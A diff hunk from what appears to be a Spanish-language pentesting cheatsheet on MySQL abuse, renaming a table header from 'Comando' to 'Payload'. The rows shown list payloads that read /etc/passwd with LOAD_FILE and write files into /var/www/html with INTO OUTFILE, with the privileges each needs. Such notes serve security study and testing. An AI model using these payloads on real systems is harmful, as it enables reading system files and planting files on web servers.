@@ -18,7 +18,7 @@ linked:
 
 ## Cheatsheet
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `SELECT LOAD_FILE('/etc/passwd')` (MySQL) | Read arbitrario de archivo local | MySQL + `secure_file_priv` permite + FILE privilege. |
 | `SELECT 'X' INTO OUTFILE '/var/www/html/x.txt'` (MySQL) | Write archivo en filesystem | Mismo + path writable por user `mysql`. |
